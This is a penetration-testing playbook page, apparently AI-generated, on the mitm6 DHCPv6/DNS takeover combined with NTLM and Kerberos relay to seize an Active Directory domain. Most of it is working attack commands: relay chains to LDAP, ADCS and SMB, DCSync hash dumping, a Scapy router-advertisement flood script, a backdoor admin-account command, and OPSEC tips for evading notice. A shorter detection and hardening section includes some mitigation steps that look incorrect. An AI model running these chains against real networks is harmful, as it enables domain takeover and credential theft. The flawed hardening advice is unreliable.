---
title: "Attack #9 — mitm6 (IPv6 DNS Spoofing DHCPv6 Takeover)"
description: "mitm6 exploits a fundamental default behaviour of Windows: even in networks that have never deployed IPv6, every Windows machine continuously sends DHCPv6…"
category: active-directory
subcategory: "Credential Access"
tags: ["active-directory", "credential-access", "ntlm", "relay"]
tools: ["Nmap", "NetExec", "Impacket", "Rubeus", "BloodHound"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-One/🔴 Attack #9 — mitm6 (IPv6 DNS Spoofing  DHCPv6 Takeover).md"
---
# 🔴 Attack #9 — mitm6 (IPv6 DNS Spoofing / DHCPv6 Takeover)

***

## 📖 How It Works

mitm6 exploits a **fundamental default behaviour of Windows**: even in networks that have never deployed IPv6, every Windows machine continuously sends DHCPv6 Solicit messages at boot, on network reconnect, and periodically during operation, asking if there is an IPv6 DHCP server available. Since most enterprise networks have no legitimate DHCPv6 server, these broadcasts go unanswered — and that silence is the attack surface.

The attacker runs mitm6, which responds to every DHCPv6 Solicit with a rogue DHCPv6 Reply, assigning the victim a link-local IPv6 address and — most critically — **designating the attacker's machine as the victim's primary DNS server**. Because Windows prefers IPv6 over IPv4 for DNS resolution, all subsequent DNS queries flow to the attacker. mitm6 then responds to specific queries (particularly WPAD) with its own IP, forcing the victim to initiate NTLM authentication to the attacker. ntlmrelayx relays that authentication to LDAP on the DC, and in the best case — an admin logging in — it automatically **creates a new Domain Admin account or adds DCSync rights** within seconds.

A study of default-configuration Windows systems found that **95% are vulnerable** to credential harvesting via this IPv6 DNS manipulation.

> ⚠️ **Windows 11 / Server 2025:** DHCPv6 remains enabled by default on all recent Windows versions. The mitigation is not automatic — administrators must explicitly disable it via GPO. IPv6 is **deeply embedded** in modern Windows kernels and disabling it is more difficult than in earlier versions.

### Why mitm6 Beats LLMNR Poisoning in Hardened Environments

| Property | LLMNR/NBT-NS Poisoning | mitm6 |
|---|---|---|
| **Protocol abused** | LLMNR (UDP 5355) / NBT-NS (UDP 137) | DHCPv6 (UDP 546/547) + DNS (UDP 53) |
| **Blocked by GPO?** | ✅ Easy to disable | ❌ Rarely disabled — DHCPv6 seen as benign |
| **Requires DNS failure** | ✅ Only fires on failed DNS lookups | ❌ Works even with perfect DNS |
| **Scope** | Only catches failed name resolutions | Intercepts ALL DNS queries from victims |
| **Trigger** | Passive — user must make typo/broken path | Active — fires on every boot / network reconnect |
| **Works if IPv6 disabled** | N/A | ❌ Fails if IPv6 completely disabled |

### The Full Attack Flow

```
1. Attacker runs mitm6 on the internal network
2. Windows machines send periodic DHCPv6 Solicit broadcasts (boot/reconnect)
3. mitm6 responds with rogue DHCPv6 Reply:
   - Assigns victim a link-local IPv6 address
   - Sets ATTACKER as victim's primary IPv6 DNS server
4. Victim's Windows now sends ALL DNS queries to attacker
5. mitm6 answers WPAD queries with attacker's IP → victim fetches fake PAC file
6. WPAD PAC fetch triggers NTLM authentication to attacker (NTLMv2 hash sent)
7. ntlmrelayx relays NTLM auth to LDAP/LDAPS on the DC
8. ntlmrelayx escalates:
   - Creates new user in Domain Admins / Enterprise Admins group (if DA relayed)
   - Adds DCSync rights to attacker-controlled account (if high-priv user relayed)
   - Adds attacker-controlled machine account (if regular user relayed)
9. Full domain compromise achieved — no initial credentials required
```

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Internal network access** | Must be on same subnet as victims — broadcast domain required for DHCPv6 |
| **IPv6 not fully disabled** | If IPv6 is completely disabled on all hosts, attack fails — but this is rare |
| **DHCPv6 not blocked by firewall** | If UDP 546/547 inbound is blocked by Windows Firewall GPO, mitm6 can't respond |
| **NTLM not disabled** | Relay chain requires NTLM (though Kerberos relay variants exist — see CVE-2026-20929) |
| **LDAP signing/channel binding not enforced** | For LDAP relay to DC; if enforced, relay to LDAPS or SMB instead |
| **Wait for trigger event** | Must wait for victim machine to reboot, reconnect, or periodically refresh DHCPv6 |

***

## 🛠️ Tools

| Tool | Platform | Role |
|---|---|---|
| **mitm6** | Linux | Core DHCPv6/DNS spoofer — the entire attack starts here |
| **ntlmrelayx.py** (Impacket) | Linux | Relay engine — receives NTLM from mitm6 victims, relays to DC LDAP |
| **Responder** | Linux | Optional — can run alongside mitm6 for additional hash capture |
| **secretsdump.py** | Linux | Post-exploitation — DCSync after relayed escalation |
| **Wireshark / tcpdump** | Linux | Monitor DHCPv6 traffic; verify victims are being assigned rogue DNS |
| **BloodHound / SharpHound** | Both | Post-DA — enumerate domain using newly created account |

***

## 💻 Full Commands

### 🔵 Step 0 — Verify IPv6 is Active on the Network

```bash
# ── Passive capture — verify DHCPv6 Solicit broadcasts ───────────────────────
sudo tcpdump -i eth0 udp port 546 or udp port 547 -v
# You should see DHCPv6 Solicit messages from Windows machines
# If you see nothing, IPv6 may be disabled on the subnet

# ── Wireshark filter ──────────────────────────────────────────────────────────
# Filter: dhcpv6 or icmpv6

# ── Nmap — enumerate IPv6-enabled hosts ──────────────────────────────────────
nmap -6 -sn fe80::/64
nmap -6 --script=ipv6-multicast-mld-list -p 0 <target>

# ── Check if WPAD is resolvable (pre-attack reconnaissance) ──────────────────
nslookup wpad
# If "Non-existent domain" → mitm6 will intercept the WPAD query
```

***

### 🔴 mitm6 — Core Tool Setup

```bash
# ── Install mitm6 ─────────────────────────────────────────────────────────────
pip3 install mitm6
# or
git clone https://github.com/dirkjanm/mitm6
cd mitm6 && pip3 install .

# ── Basic run — target a specific domain ─────────────────────────────────────
sudo mitm6 -d corp.local

# ── Recommended run — target domain, suppress router advertisements ───────────
sudo mitm6 -d corp.local --no-ra
# --no-ra = don't send Router Advertisements (reduces noise, more targeted)

# ── Specify network interface explicitly ─────────────────────────────────────
sudo mitm6 -i eth0 -d corp.local --no-ra

# ── Target a specific subnet only ─────────────────────────────────────────────
sudo mitm6 -d corp.local -i eth0 --ignore-nofqdn --no-ra

# ── Verbose output (see each DHCPv6 response sent) ───────────────────────────
sudo mitm6 -d corp.local --no-ra -v

# ── What you'll see in output:
# [*] Sent spoofed reply to fe80::xxxx for WPAD.corp.local
# [*] Sent spoofed reply to fe80::xxxx for corp.local
# This means victims are now routing DNS through you
```

***

### 🔴 ntlmrelayx Setup — LDAP Relay for DA Account Creation

```bash
# ── STEP 1: Prepare relay to LDAP (primary escalation method) ─────────────────

# Relay to LDAP — auto-create new user in Domain Admins (if DA logs in)
ntlmrelayx.py -6 -t ldap://DC01.corp.local -wh attacker-wpad \
  -smb2support -l loot/

# ── Flags explained:
# -6           = enable IPv6 support (critical for mitm6 relay)
# -t ldap://   = relay target (DC LDAP)
# -wh          = WPAD hostname to respond to (attacker-wpad = your machine's name)
# -smb2support = support SMBv2 on the relay listener
# -l loot/     = dump LDAP info to this directory

# ── Relay to LDAPS (if LDAP signing enforced) ─────────────────────────────────
ntlmrelayx.py -6 -t ldaps://DC01.corp.local -wh attacker-wpad \
  -smb2support -l loot/

# ── STEP 2: Run mitm6 in a separate terminal ──────────────────────────────────
sudo mitm6 -d corp.local --no-ra

# ── STEP 3: Wait for a privileged user to log in or machine to reboot ─────────
# ntlmrelayx output when DA is relayed:
# [*] HTTPD(80): Connection from 10.10.10.50 controlled, attacking target ldap://DC01.corp.local
# [*] Authenticating against ldap://DC01.corp.local as CORP\Administrator
# [*] Adding new user with username: QMFbhMXG and password: XYZ to domain
# [*] Privilege Escalation Done! QMFbhMXG is in the Administrators group!

echo "Domain Admin account created — game over"
```

***

### 🔴 Full Attack Chain — mitm6 → LDAP Relay → DCSync

```bash
# ── Terminal 1: Start mitm6 ───────────────────────────────────────────────────
sudo mitm6 -d corp.local --no-ra -i eth0

# ── Terminal 2: Start ntlmrelayx with LDAP target + loot dump ────────────────
ntlmrelayx.py -6 -t ldap://DC01.corp.local -wh attacker-wpad \
  -smb2support -l loot/ --no-da --no-acl

# Wait for a domain user to authenticate...

# ── Terminal 3 (after successful relay): Check loot directory ────────────────
ls loot/
# Contains: domain_computers.html, domain_users.html, domain_groups.html etc.
cat loot/domain_users.html

# ── If a Domain Admin was relayed — new account auto-created ─────────────────
# ntlmrelayx creates: random username + random password
# Check ntlmrelayx output for the credentials

# ── DCSync using the newly created DA account ─────────────────────────────────
secretsdump.py corp.local/QMFbhMXG:'CreatedPassword'@DC01.corp.local

# ── OR add DCSync rights to your own pre-created account ─────────────────────
ntlmrelayx.py -6 -t ldap://DC01.corp.local -wh attacker-wpad \
  -smb2support --escalate-user low_user

# After escalation:
secretsdump.py corp.local/low_user:'KnownPassword'@DC01.corp.local -just-dc-ntlm
```

***

### 🔴 mitm6 → ADCS Relay (Most Destructive Chain)

```bash
# ── If LDAP signing/channel binding blocks LDAP relay, target ADCS instead ───

# Terminal 1: mitm6
sudo mitm6 -d corp.local --no-ra

# Terminal 2: ntlmrelayx to ADCS HTTP enrollment endpoint
ntlmrelayx.py -6 -t http://ADCS01.corp.local/certsrv/certfnsh.asp \
  -wh attacker-wpad -smb2support --adcs --template "DomainController"

# When DC machine account authenticates (via coercion or reboot):
# ntlmrelayx requests a DomainController template certificate for DC01$
# Output: [*] Got certificate! Saved as DC01$.pfx

# Request TGT using the DC machine certificate (PKINIT)
.\Rubeus.exe asktgt /user:DC01$ /certificate:DC01$.pfx /password:'' /ptt /nowrap

# DCSync using DC machine account TGT
secretsdump.py -k -no-pass corp.local/'DC01$'@DC01.corp.local -just-dc-ntlm

# Result: Full domain hash dump — total compromise
```

***

### 🔴 mitm6 → SMB Relay (Alternative When LDAP Is Locked Down)

```bash
# Terminal 1: mitm6
sudo mitm6 -d corp.local --no-ra

# Terminal 2: ntlmrelayx to SMB targets (SMB signing must be disabled on target)
nxc smb 10.10.10.0/24 --gen-relay-list smb_targets.txt
ntlmrelayx.py -6 -tf smb_targets.txt -wh attacker-wpad \
  -smb2support -i

# When relay succeeds to SMB target:
nc 127.0.0.1 11000   # Interactive SMB shell as relayed user

# Execute commands on relayed target
ntlmrelayx.py -6 -tf smb_targets.txt -wh attacker-wpad \
  -smb2support -c "net user hacker P@ssword123! /add && net localgroup administrators hacker /add"
```

***

### 🔴 Advanced: krbrelayx Integration — Kerberos Relay via mitm6

```bash
# ── CVE-2026-20929: Relay Kerberos tickets instead of NTLM ─────────────────
# This bypasses some defences designed for NTLM-only relay

# Terminal 1: mitm6
sudo mitm6 -d corp.local --no-ra

# Terminal 2: krbrelayx — accepts Kerberos from mitm6 victims
python3 krbrelayx.py -ts DC01.corp.local

# Terminal 3: On DC, check for new account creation (same as LDAP relay)
# krbrelayx will auto-escalate if a machine account with sufficient privileges relays

# This is more stealthy than NTLM relay in modern defences
```

***

### 🔴 RA Flooding — Alternative When DHCPv6 Relay Fails

```bash
# ── If DHCPv6 isn't triggering, use Router Advertisement flooding ────────────

# Terminal 1: RA flood (forces IPv6 priority without DHCP)
sudo python3 -m pip install scapy
python3 - <<'EOF'
from scapy.all import *
from scapy.layers.inet6 import *

iface = "eth0"
target_prefix = "2001:db8::/64"  # Your target IPv6 prefix

def flood_ra():
    pkt = Ether()/IPv6(src="fe80::1", dst="ff02::1")/ICMPv6ND_RA()/ICMPv6NDOptPrefixInfo(prefix=target_prefix)
    while True:
        sendp(pkt, iface=iface, interval=1, verbose=0)

flood_ra()
EOF

# This forces all victims to prefer IPv6 — DNS then flows to your mitm6
```

***

### 🔴 Delegate Access — Targeted Domain Escalation via Relay

```bash
# ── Instead of creating new user, grant specific rights to existing user ─────

# ntlmrelayx with --escalate-user (adds DCSync rights)
ntlmrelayx.py -6 -t ldap://DC01.corp.local -wh attacker-wpad \
  -smb2support --escalate-user "corp\low_priv_user"

# ntlmrelayx with --add-computer (add computer account)
ntlmrelayx.py -6 -t ldap://DC01.corp.local -wh attacker-wpad \
  -smb2support --add-computer attacker-owned

# ntlmrelayx with --no-acl (just dump LDAP, don't modify)
ntlmrelayx.py -6 -t ldap://DC01.corp.local -wh attacker-wpad \
  -smb2support --no-acl

# Specific escalation after relay — read the LDAP dump first, then decide
secretsdump.py -hashes :HASH corp.local/elevated_user@DC01.corp.local -just-dc-ntlm
```

***

### 🔴 Monitoring — Verify mitm6 is Working

```bash
# ── Check which victims have been assigned rogue DNS ─────────────────────────
sudo tcpdump -i eth0 udp port 547 -v | grep -i "solicit\|advertise\|reply"

# ── Watch for WPAD requests hitting your machine ──────────────────────────────
sudo tcpdump -i eth0 port 80 -v | grep -i "wpad"

# ── Monitor ntlmrelayx for successful relays ──────────────────────────────────
# Watch for lines containing:
# "HTTPD: Received connection from..."
# "Authenticating against ldap://..."
# "Adding new user..."
# "Privilege Escalation Done!"
```

***

## 🧩 Troubleshooting

| Error | Cause | Fix |
|---|---|---|
| **mitm6 not receiving DHCPv6 Solicit messages** | IPv6 disabled on victim network or firewall blocking UDP 546/547 | Run `sudo tcpdump udp port 546` to verify DHCPv6 traffic exists; if none, try different subnet or disable IPv6 filtering |
| **ntlmrelayx LDAP relay fails with "signing error"** | LDAP signing or channel binding enforced on DC | Switch to LDAPS (`-t ldaps://`), ADCS HTTP relay, or SMB relay instead |
| **No WPAD requests seen in ntlmrelayx output** | WPAD proxy already configured on victims via GPO, or DNS not redirecting | Verify mitm6 is responding to WPAD queries with `tcpdump port 80`; check if victims have hardcoded WPAD server in registry |
| **IPv6 completely disabled on subnet** | GPO or Registry DisabledComponents flag set to 0xFF | Impossible to exploit with mitm6; use LLMNR/NBT-NS poisoning instead |
| **Relay target unreachable after NTLM capture** | Firewall rule blocks attacker→DC on port 389/636 (LDAP/LDAPS) | Confirm network path with `nc -zv DC01.corp.local 389`; consider SMB relay (port 445) as alternative |
| **ntlmrelayx creates user but no DCSync rights** | Relay not from Domain Admin or Enterprise Admin | Use `--escalate-user` flag instead; or wait for DA to authenticate |
| **mitm6 causes network-wide DNS failures** | Router Advertisement (RA) messages disrupting routing | Always use `--no-ra` flag; scope to exact domain with `-d corp.local` |
| **Relay account created but can't use it for DCSync** | Account locked, password expired, or UPN format wrong | Verify format: `secretsdump.py corp.local/USERNAME:'PASSWORD'@DC01.corp.local`; check account status with `net user` |

***

## 🎯 OPSEC Tips

- **Always use `--no-ra`** — Router Advertisement messages are noisy and can disrupt network routing for all victims, which causes immediate IT investigation
- **Scope to your target domain** with `-d corp.local` — without this, mitm6 answers ALL DNS queries including internet traffic, causing visible disruption
- **Run during high-activity windows** — morning logon storms (8–9am), after patching cycles, or when large numbers of machines reboot give you maximum relay opportunities
- **Target LDAP over SMB** when possible — LDAP relay creates persistent domain objects (new admin users, DCSync rights) rather than temporary shell access
- **Use `--no-da --no-acl` flags in ntlmrelayx initially** — dump LDAP info first to understand the domain before making noisy modifications
- **mitm6 causes minor IPv6 disruption** — some machines may experience temporary DNS resolution issues; keep attack windows short (15–30 minutes)
- **Combine with Responder on different protocols** — run mitm6 for DHCPv6/DNS and Responder in analyse mode simultaneously to map the full authentication landscape
- **Time-to-execute estimate:** mitm6 setup (5 min) + waiting for trigger event (5–30 min depending on logon activity) = 10–35 minutes to domain compromise
- **Tool versions:** Use latest Impacket for ntlmrelayx (GitHub main branch preferred over pip); mitm6 1.0+ recommended; test in lab first for version compatibility

***

## 🛡️ Detection — Event IDs / Network Indicators

| Source | What to Look For |
|---|---|
| **Windows Event 4741** | New computer account created — ntlmrelayx `--add-computer` via relayed auth |
| **Windows Event 4728/4732** | User added to privileged group — DA account creation by ntlmrelayx |
| **Windows Event 4662** | ACE modification on AD object — DCSync rights being granted to account |
| **Windows Event 4624 Type 3** | Logon from unexpected source IP (attacker's machine) |
| **Network — DHCPv6 UDP 546/547** | Rogue DHCPv6 server responding on the subnet (only one should exist) |
| **Network — DNS** | Unusual DNS responses from non-DC IP addresses; WPAD queries answered by unexpected host |
| **IDS/Zeek/Suricata** | DHCPv6 Advertise/Reply messages from a host not designated as a DHCP server |
| **SIEM** | New privileged accounts created outside of standard provisioning workflows |

**Primary detection signature:** A **DHCPv6 Reply or Advertisement packet from a host that is not the legitimate DHCP server** is an immediate indicator of mitm6 in operation. Network-level detection via Zeek scripts or Suricata rules monitoring DHCPv6 traffic is the most reliable defence. On the Windows side, a new Domain Admin account created without a corresponding ITSM ticket is a high-confidence alert.

### Sigma Rules for Detection

**Rule: Rogue DHCPv6 Server Detection**
```yaml
title: DHCPv6 Advertise from Non-DHCP Host
detection:
  selection:
    NetworkProtocol: DHCPv6
    DHCPv6MessageType: Advertise
    SourceIP: '!10.10.10.10'  # Exclude legitimate DHCP server
  condition: selection
```

**Rule: Suspicious LDAP Modifications via Relay**
```yaml
title: Bulk LDAP Group Modification (Possible Relay)
detection:
  selection:
    EventID: 5136
    ObjectClass: group
    AttributeLDAPDisplayName: member
    ValueAdded: '*'
  condition: selection | count(ObjectDN) > 5 and timespan(5m)
```

### EDR-Specific Detections

- **Crowdstrike Falcon:** Monitor for IPv6 DNS server changes + NTLM relay auth in short time window
- **Defender for Endpoint:** Alert on new user creation by system processes; flag DHCPv6 server role changes
- **Sentinel One:** Watch for network discovery commands (ipconfig /all, Get-NetIPConfiguration) followed by WPAD lookups
- **Carbon Black:** Correlate ntlmrelayx.py process creation with ldap:// network connections to DC

### Hardening Commands

```powershell
# ── Disable DHCPv6 client via Group Policy ─────────────────────────────────
Computer Configuration → Administrative Templates →
  Network → TCPIP Settings → IPv6 Transition Technologies
    Set "6to4 State" = Disabled
    Set "ISATAP State" = Disabled

# ── Registry-based mitigation (local machine) ────────────────────────────────
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters" /v DisabledComponents /t REG_DWORD /d 0xFF /f
# 0xFF disables all IPv6 completely (aggressive but effective)
# 0x01 disables IPv6 on all non-tunnel interfaces (balanced)

# ── Windows Firewall — Block DHCPv6 inbound ───────────────────────────────────
powershell -NoProfile -Command "Get-NetFirewallRule -DisplayName '*DHCPv6*' | Set-NetFirewallRule -Enabled False"

# ── IPv6 priority adjustment (reduces DHCPv6 preference) ────────────────────
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters" /v IpUseDhcpNameServer /t REG_DWORD /d 0 /f

# ── RA Guard (prevents rogue router advertisements) ───────────────────────────
# On edge firewall/router:
# Cisco: ipv6 nd raguard attach-policy {policy-name}
# Juniper: forwarding-options family inet6 router-discovery {ra-guard}

# ── Enforce LDAP signing + channel binding on DC ────────────────────────────
dsregcmd /status  # Check current settings
# Set via GPO: Computer Config → Policies → Windows Settings → Security Settings →
#   Local Policies → Security Options:
#   "Domain member: Require strong (Windows 2000 or later) session key"
#   "LDAP client signing requirements" = Require Signing
```

***

## 🗺️ MITRE ATT&CK

| Technique | ID | Description |
|---|---|---|
| **Adversary-in-the-Middle** | T1557 | mitm6 performs MITM on IPv6 DNS traffic |
| **LLMNR/NBT-NS Poisoning** | T1557.001 | DHCPv6 hijacking is conceptually similar to LLMNR poisoning — intercepting legitimate protocol to redirect to attacker |
| **Exploitation for Privilege Escalation** | T1548 | ntlmrelayx relay chain escalates from low user to Domain Admin |
| **Account Manipulation** | T1098 | Creation of new Domain Admin account via relayed LDAP authentication |
| **NTLM Relay** | (Implied T1557 + T1040) | Core technique: capture NTLM auth, relay to different service |

***

## 🔗 Attack Chain Context

```
[mitm6 DHCPv6 Poisoning] ──→ Rogue DNS Server for All Subnet Victims
         │
         ├──→ WPAD NTLM Auth → ntlmrelayx LDAP → New DA Account → DCSync
         ├──→ WPAD NTLM Auth → ntlmrelayx LDAPS → Shadow Credentials → TGT
         ├──→ WPAD NTLM Auth → ntlmrelayx ADCS → DC Cert → TGT → DCSync
         ├──→ WPAD NTLM Auth → ntlmrelayx SMB → Shell + LSASS dump → PtH
         ├──→ DNS hijack → redirect all traffic → full MitM for credential harvest
         └──→ Wait for DA to log in → instant Enterprise Admin creation → game over
```

**The scenario that ends engagements in minutes:** mitm6 is running. An administrator logs into any domain-joined workstation on the subnet — even just to check something. Their machine sends a DHCPv6 Solicit. mitm6 responds. WPAD queries flow to the attacker. NTLM authentication arrives at ntlmrelayx. ntlmrelayx relays to DC LDAP. A new account is created in Domain Admins. DCSync is run. Every domain password hash is exfiltrated. **Total time: under 3 minutes**.

**Cross-references:**
- Attack #10: Credential Hunting in Shares / GPP Passwords (alternative initial access without relay)
- Attack #72: LAPS Deprecation & Takeover (modern mitigation mechanism, but requires proper deployment)

***

> ✅ **Attack #9 — mitm6 complete.** Tell me to move on when you're ready for **Attack #10 — Credential Hunting in Shares / GPP Passwords**.

Sources
 MITM6 + NTLM Relay: How IPv6 Auto-Configuration Leads to Full ... https://www.resecurity.com/blog/article/mitm6-ntlm-relay-how-ipv6-auto-configuration-leads-to-full-domain-compromise
 IPv6 Attacks - README - Preperation | OSCP https://oscp.adot8.com/active-directory/initial-attack-strategy/ipv6-attacks
 MITM6 IPv6 Attack | Pentesting Checklist - GitBook https://gokulkarthik.gitbook.io/pentesting-checklist/windows-and-active-directory/initial-attack-vectors/mitm6-ipv6-attack
 [PDF] Exploiting Ipv6 DNS Behavior in Windows 11 Networks - IJFMR https://www.ijfmr.com/papers/2025/6/58968.pdf
 IPv6 - Man in the Middle | We explain attack and defense - ProSec https://www.prosec-networks.com/en/blog/ipv6-mitm/
 IPv6 DNS Takeover with MitM6: Strategies for Network Security https://www.evolvesecurity.com/blog-posts/tools-of-the-trade-ipv6-dns-takeover-with-mitm6
 IPv6 Attacks - Infosec Notes https://notes.frozensoliddesigns.com/exploitation/active-directory/ipv6-attacks
 Fragmentation Considered Poisonous https://arxiv.org/pdf/1205.4011.pdf
 Security of Patched DNS http://arxiv.org/pdf/1205.5190.pdf
 The Impact of DNS Insecurity on Time https://arxiv.org/pdf/2010.09338.pdf
 Hybrid Detection and Mitigation of DNS Protocol MITM attack based on Firefly algorithm with Elliptical Curve Cryptography https://publications.eai.eu/index.php/phat/article/download/3177/2319
 Injection Attacks Reloaded: Tunnelling Malicious Payloads over DNS https://arxiv.org/pdf/2205.05439.pdf
 Encrypted and Covert DNS Queries for Botnets: Challenges and
  Countermeasures http://arxiv.org/pdf/1909.07099.pdf
 HADES: Detecting Active Directory Attacks via Whole Network Provenance
  Analytics http://arxiv.org/pdf/2407.18858.pdf
 A Survey on Malicious Domains Detection through DNS Data Analysis https://arxiv.org/pdf/1805.08426.pdf
 IPv6 Attack with MITM6 & NTLMRELAYX - YouTube https://www.youtube.com/watch?v=AmcWc2CjXx8
 How to prevent IPv6 DNS Takeover with mitm6 - LinkedIn https://www.linkedin.com/posts/abdussatter51_ipv6-dns-take-over-on-active-directory-activity-7319677013928067072-PP3o
 Relaying Kerberos with MiTM6 - CVE-2026-20929 - YouTube https://www.youtube.com/watch?v=RGoSvD-P_FU
 Hacks Weekly #61 - Man in the middle with MITM6 and NTLMRelay https://www.youtube.com/watch?v=qb0l5cPz0nw
 Domain Admin via IPv6 DNS Takeover : r/HowToHack - Reddit https://www.reddit.com/r/HowToHack/comments/e8n67r/domain_admin_via_ipv6_dns_takeover/
 Six Minutes for MiTM6 - YouTube https://www.youtube.com/watch?v=qrFxDNotgO8
 Network Relaying and NTLM Relay Attacks in Windows Domains https://www.lrqa.com/en/cyber-labs/network-relaying-abuse-windows-domain/
 caster0x00/Intercept: MITM Field Manual - GitHub https://github.com/caster0x00/MITMonster
